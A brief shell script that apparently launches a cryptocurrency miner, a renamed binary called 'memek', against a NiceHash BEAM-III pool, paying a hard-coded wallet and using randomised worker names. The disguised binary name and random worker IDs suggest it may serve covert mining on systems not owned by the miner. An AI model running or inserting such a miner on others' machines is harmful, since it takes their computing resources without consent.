POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353

WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk

WORKER=$(echo $(shuf -i 1-100000 -n 1)-GPU)

chmod +x memek

./memek --algo BEAM-III --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user $WALLET.$WORKER --ethstratum ETHPROXY --mode a
